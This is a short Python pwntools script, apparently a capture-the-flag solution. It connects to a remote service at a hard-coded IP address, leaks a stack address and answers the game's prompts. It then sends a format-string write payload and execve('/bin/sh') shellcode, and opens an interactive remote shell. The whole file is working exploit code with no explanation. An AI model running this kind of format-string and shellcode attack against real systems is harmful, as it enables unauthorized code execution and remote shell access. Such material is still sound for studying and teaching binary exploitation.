from pwn import *
import time
context(log_level = "debug", arch = 'amd64', os = 'linux')
t = remote('111.198.29.45', 31374)
t.recvuntil('we will tell you two secret ...\n')
v3_addr = int(t.recvuntil('\n', drop = True)[-7:],16)
log.info(hex(v3_addr))
t.sendlineafter('name be:\n', 'carl')
t.sendlineafter('go?east or up?:\n', 'east')
t.sendlineafter('leave(0)?:\n', '1')
t.sendlineafter('address\'\n', str(v3_addr))
t.sendlineafter('wish is:\n', '%'+'85c%7$n')
payload = asm(shellcraft.execve('/bin/sh'))
t.sendlineafter('USE YOU SPELL\n', payload)
sleep(0.1)
t.interactive()



